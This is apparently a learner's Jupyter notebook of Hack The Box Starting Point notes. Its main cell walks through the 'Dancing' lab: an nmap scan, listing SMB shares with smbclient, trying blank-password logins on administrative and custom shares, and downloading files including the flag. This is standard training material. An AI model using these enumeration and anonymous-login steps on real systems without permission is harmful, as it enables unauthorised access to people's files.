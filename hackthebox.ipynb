{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOpaXxG17Iuj9P4+RvKr+aa",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/dirkpmueller/100-days-of-code-exercises/blob/main/hackthebox.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "##**Hack the box**\n",
        "- set up VMware\n",
        "- downloaded and installed Parrot OS Security\n",
        "- downloaded and run OpenVPN\n"
      ],
      "metadata": {
        "id": "9ssdICmdwAu1"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "##**Tier 0 Lab1 - MEOW**\n"
      ],
      "metadata": {
        "id": "h9I89PIZ4YMo"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "##**Tier 0 Lab2 - FAWN**\n",
        "\n",
        "- FTP\n",
        "- Network\n",
        "- Protocols\n",
        "- Reconnaissance\n",
        "- Anonymous/Guest Access\n"
      ],
      "metadata": {
        "id": "9y12563bfvJl"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "##**T0L3 - Dancing**\n",
        "- We start, as always, by scanning the target once we are connected to the VPN. Running the following\n",
        "command will make nmap scan all of the ports and display service versions for each of them.\n",
        "\n",
        "    `sudo nmap -sV {ip}`\n",
        "\n",
        "- port 445 TCP for SMB is up and running, which means that we\n",
        "have an active share that we could potentially explore. Think of this share as a folder that can be accessed\n",
        "over the internet\n",
        "- In order to successfully enumerate share content on the remote system, we can use a script called\n",
        "smbclient . If the script is not present on your Virtual Machine, you can install it by typing the following\n",
        "command in your terminal (for Debian based operating systems):\n",
        "    \n",
        "    `sudo apt-get install smbclient`\n",
        "\n",
        "- Smbclient will attempt to connect to the remote host and check if there is any authentication required. If\n",
        "there is, it will ask you for a password for your local username. We should take note of this. If we do not\n",
        "specify a specific username to smbclient when attempting to connect to the remote host, it will just use your\n",
        "local machine's username. \n",
        "\n",
        "- In this case, we do not have such credentials, so what we will be trying to perform is any of\n",
        "the following:\n",
        "  - Guest authentication\n",
        "  - Anonymous authentication\n",
        "\n",
        "  Any of these will result in us logging in without knowing a proper username/password combination and\n",
        "seeing the files stored on the share.\n",
        "\n",
        "    `smbclient -L {ip}`\n",
        "\n",
        "    `[-L|--list=HOST] : Selecting the targeted host for the connection request.`\n",
        "\n",
        "  - `ADMIN$` - Administrative shares are hidden network shares created by the Windows NT family of\n",
        "operating systems that allow system administrators to have remote access to every disk volume on a\n",
        "network-connected system. These shares may not be permanently deleted but may be disabled.\n",
        "\n",
        "  - `C$` - Administrative share for the C:\\ disk volume. This is where the operating system is hosted.\n",
        "\n",
        "  - `IPC$` - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.\n",
        "\n",
        "  - `WorkShares` - Custom share.\n",
        "\n",
        "- attempting to log in without the\n",
        "proper credentials to find improperly configured permissions on any of these shares. We'll just give a blank\n",
        "password for each username to see if it works.\n",
        "\n",
        "    ```SMB1 disabled -- no workgroup available\n",
        "┌─[eu-starting-point-2-dhcp]─[10.10.14.187]─[htb-dirkpm@htb-rpvrgi3e7y]─[~]\n",
        "└──╼ [★]$ smbclient \\\\\\\\10.129.209.78\\\\ADMIN$\n",
        "Password for [WORKGROUP\\htb-dirkpm]:\n",
        "tree connect failed: NT_STATUS_ACCESS_DENIED\n",
        "┌─[eu-starting-point-2-dhcp]─[10.10.14.187]─[htb-dirkpm@htb-rpvrgi3e7y]─[~]\n",
        "└──╼ [★]$ smbclient \\\\\\\\10.129.209.78\\\\C$\n",
        "Password for [WORKGROUP\\htb-dirkpm]:\n",
        "tree connect failed: NT_STATUS_ACCESS_DENIED\n",
        "┌─[eu-starting-point-2-dhcp]─[10.10.14.187]─[htb-dirkpm@htb-rpvrgi3e7y]─[~]\n",
        "└──╼ [★]$ smbclient \\\\\\\\10.129.209.78\\\\IPC$\n",
        "Password for [WORKGROUP\\htb-dirkpm]:\n",
        "Try \"help\" to get a list of possible commands.\n",
        "smb: \\> EXIT\n",
        "┌─[eu-starting-point-2-dhcp]─[10.10.14.187]─[htb-dirkpm@htb-rpvrgi3e7y]─[~]\n",
        "└──╼ [★]$ smbclient \\\\\\\\10.129.209.78\\\\Workshares\n",
        "Password for [WORKGROUP\\htb-dirkpm]:\n",
        "Try \"help\" to get a list of possible commands.\n",
        "smb: \\> \n",
        "```\n",
        "\n",
        "- The WorkShares SMB share was poorly configured, allowing us to log in without the appropriate\n",
        "credentials. We can see our terminal prompt changed to `smb: \\>` , letting us know that our shell is now\n",
        "interacting with the service.\n",
        "\n",
        "   ```ls : listing contents of the directories within the share\n",
        "cd : changing current directories within the share\n",
        "get : downloading the contents of the directories within the share\n",
        "exit : exiting the smb shell\n",
        "```\n",
        "\n",
        "    ```\n",
        "  smb: \\> ls\n",
        "  .                                   D        0  Mon Mar 29 09:22:01 2021\n",
        "  ..                                  D        0  Mon Mar 29 09:22:01 2021\n",
        "  Amy.J                               D        0  Mon Mar 29 10:08:24 2021\n",
        "  James.P                             D        0  Thu Jun  3 09:38:03 2021\n",
        "\n",
        "\t\t5114111 blocks of size 4096. 1751626 blocks available\n",
        "    ```\n",
        "\n",
        "    ```\n",
        "smb: \\> cd Amy.J\n",
        "smb: \\Amy.J\\> ls\n",
        "  .                                   D        0  Mon Mar 29 10:08:24 2021\n",
        "  ..                                  D        0  Mon Mar 29 10:08:24 2021\n",
        "  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021\n",
        "\n",
        "\t\t5114111 blocks of size 4096. 1751610 blocks available\n",
        "smb: \\Amy.J\\> get worknotes.txt\n",
        "getting file \\Amy.J\\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n",
        "    ```\n",
        "\n",
        "    ```\n",
        "    smb: \\Amy.J\\> cd ..\n",
        "smb: \\> ls\n",
        "  .                                   D        0  Mon Mar 29 09:22:01 2021\n",
        "  ..                                  D        0  Mon Mar 29 09:22:01 2021\n",
        "  Amy.J                               D        0  Mon Mar 29 10:08:24 2021\n",
        "  James.P                             D        0  Thu Jun  3 09:38:03 2021\n",
        "\n",
        "\t\t5114111 blocks of size 4096. 1751594 blocks available\n",
        "smb: \\> cd James.P\n",
        "smb: \\James.P\\> ls\n",
        "  .                                   D        0  Thu Jun  3 09:38:03 2021\n",
        "  ..                                  D        0  Thu Jun  3 09:38:03 2021\n",
        "  flag.txt                            A       32  Mon Mar 29 10:26:57 2021\n",
        "\n",
        "\t\t5114111 blocks of size 4096. 1751594 blocks available\n",
        "smb: \\James.P\\> get flag.txt\n",
        "getting file \\James.P\\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)\n",
        "    ```\n",
        "\n",
        "    ```\n",
        "    smb: \\James.P\\> exit\n",
        "┌─[eu-starting-point-2-dhcp]─[10.10.14.187]─[htb-dirkpm@htb-rpvrgi3e7y]─[~]\n",
        "└──╼ [★]$ ls\n",
        "Desktop  flag.txt  my_data  Templates  worknotes.txt\n",
        "\n",
        "    ```"
      ],
      "metadata": {
        "id": "woil0iXrLU_m"
      }
    }
  ]
}